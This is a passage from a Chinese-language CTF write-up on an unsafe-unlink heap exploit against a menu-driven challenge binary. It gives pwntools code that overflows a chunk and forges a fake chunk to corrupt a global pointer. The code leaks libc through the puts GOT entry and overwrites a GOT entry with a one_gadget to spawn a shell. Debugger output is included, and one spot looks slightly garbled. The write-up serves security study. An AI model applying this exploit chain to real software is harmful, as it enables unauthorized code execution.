    0x602070 :    0x0000000000602058  2 )
        {
          if ( v3 == 3 )
          {
            v5 = sub_400B07();//释放堆块
            goto LABEL_14;
          }
          if ( v3 == 4 )
          {
            v5 = sub_400BA9();//Useless
            goto LABEL_14;
          }
        }
        else if ( v3 == 1 )
        {
          v5 = sub_400936();//申请堆块
          goto LABEL_14;
        }
        v5 = -1;
    LABEL_14:
        if ( v5 )
          puts("FAIL");
        else
          puts("OK");
        fflush(stdout);
      }
      return 0LL;
    }
使用pwntools来编写交互接口，前三个操作分别为分配内存，写入数据，释放内存，第四个操作是useless的。
漏洞存在于write部分，程序并没有规定写入数据的长度，导致产生heap overflow。
    def malloc(size):
        p.sendline("1")
        p.sendline(size)
    def write(chunk,size,strs):
        p.sendline("2")
        p.sendline(chunk)    
        p.sendline(size)
        p.sendline(strs)
    def free(chunk):
        p.sendline("3")
        p.sendline(chunk)
**利用手法**
我们申请五个内存块，大小为0x80字节（small
bin的大小）此处的第一个chunk属于无用chunk，申请后的空间与之后的chunk内存空间不连续。主要实现unlink的是中间的三个chunk（2，3，4），创建chunk5在chunk4和topchunk之间，是为了防止chunk4在free时，被top
chunk直接合并，导致unlink失败。
    #Unlink
    malloc("128") #chunk1 use later
    malloc("128") #chunk2
    malloc("128") #chunk3
    malloc("128") #chunk4 
    malloc("128") #chunk5 avoid topchunk
    free("3") # free chunk3-->unsort bins
    #write("2",,) #wirte chunk2 heap overflow -->chunk3(free)
    free("4") #unlink
第一次free chunk3，查看unsort bins。只有一个chunk3连接在bins。
    gef➤  heap bins unsorted 
    ────────────────────[ Unsorted Bin for arena 'main_arena' ]────────────────────
    [+] Found base for bin(0): fw=0x184a540, bk=0x184a540
     →   FreeChunk(addr=0x184a550,size=0x90)
然后free chunk4 ，查看unsrot bins，发现还是只有一个chunk，但是这个chunk其实是chunk3和chunk4的合并，在free
chunk4的过程中，调用了unlink(chunk3)。
    gef➤  heap bins unsorted 
    ────────────────────[ Unsorted Bin for arena 'main_arena' ]────────────────────
    [+] Found base for bin(0): fw=0x184a540, bk=0x184a540
     →   FreeChunk(addr=0x184a550,size=0x120)
于是我们构造Unlink，当然与上文不同的是我们并不能真的将chunk3
free，因为我们需要chunk的指针还在数组中，作为绕过unlink检查机制的一部分。
如何进行Overflow。
  * 覆盖PRE INUSE位为0，就可以伪造上一个chunk为free
  * 覆盖 PRE SIZE，这样可以自由控制fake chunk 的大小。
**触发Unlink**
代码如下，我们在chunk2中构造了一个0x80的fake chunk。
    #Unlink
    malloc("128") #chunk1 use later
    malloc("128") #chunk2
    malloc("128") #chunk3
    malloc("128") #chunk4 avoid topchunk
    global_ptr=0x602150
    sizeofint=8
    write("2","144",p64(0)+p64(0x80)+p64(global_ptr-3*sizeofint)+p64(global_ptr-2*sizeofint)+'a'*96+p64(0x80)+p64(0x90)) ##wirte chunk2 heap overflow
    free("3") #unlink
Unlink之后，修改全局变量global_ptr
    gef➤  x/20xg 0x602140
    0x602140:    0x0000000000000000    0x00000000026be020
    0x602150:    0x0000000000602138put_got
    def read_anywhere(addr):
        write("2","24",p64(1)*2+p64(addr))
        free("1")
    read_anywhere(0x602020) #example
通过pust函数来 _Leak Address_ ，计算出libc的地址
    read_anywhere(0x602020)
    p.recv(0x37)
    libc_base=u64(p.recv(6).ljust(8,"x00"))-0x6f690
    print "libc_base="+hex(libc_base)
最后，直接用one_gadget”解决战斗”。
    one_gadget=0xf02a4
    write_anywhere(0x602018,"8",p64(one_gadget+libc_base))
    print "[+] one_gadget="+hex(one_gadget+libc_base)
    free("1")
Getshell
    process 10908 is executing new program: /bin/dash
    $ whoami
    migraine
## 小结
Unsafe_Unlink在原理上是非常简单的一种攻击手段，关键点并不在漏洞本身，Unlink技术的有趣之处在于它扩充了攻击面。例如在[上一篇文章](https://www.anquanke.com/post/id/193132)中的consolidate手段在没有unlink的情况下是很难完成一次利用的（也许），同时unlink也需要一些条件，这样就很容易形成两个手段相结合的技术，这样的题目就会非常有趣。（Hack
for fun！）